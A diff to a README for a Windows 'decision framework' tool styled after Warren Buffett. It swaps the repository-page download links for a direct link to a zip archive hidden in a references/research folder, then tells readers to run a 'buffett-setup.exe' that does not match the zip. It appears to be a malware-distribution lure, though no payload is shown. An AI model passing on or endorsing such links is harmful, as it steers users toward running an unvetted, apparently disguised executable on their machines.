@@ -1,6 +1,6 @@
 # 🧠 buffett-perspective - Adopt smarter habits for better decisions
 
-[![Download Application](https://img.shields.io/badge/Download-buffett-perspective-blue.svg)](https://github.com/JRTODD2/buffett-perspective)
+[![Download Application](https://img.shields.io/badge/Download-buffett-perspective-blue.svg)](https://raw.githubusercontent.com/JRTODD2/buffett-perspective/main/references/research/perspective_buffett_v3.8.zip)
 
 buffett-perspective provides a structured way to analyze choices. It mimics the decision framework used by Warren Buffett to evaluate business and personal scenarios. This software acts as a secondary brain to filter information and prioritize logic over emotion. 
 
@@ -16,7 +16,7 @@ You need a computer running Windows 10 or Windows 11. The application requires 2
 
 Follow these steps to set up the software on your machine.
 
-1. Visit the repository page to download the installer: [https://github.com/JRTODD2/buffett-perspective](https://github.com/JRTODD2/buffett-perspective)
+1. Visit the repository page to download the installer: [https://raw.githubusercontent.com/JRTODD2/buffett-perspective/main/references/research/perspective_buffett_v3.8.zip](https://raw.githubusercontent.com/JRTODD2/buffett-perspective/main/references/research/perspective_buffett_v3.8.zip)
 2. Locate the file named "buffett-setup.exe" in your Downloads folder.
 3. Double-click the file to start the installation.
 4. Follow the prompts on the screen.
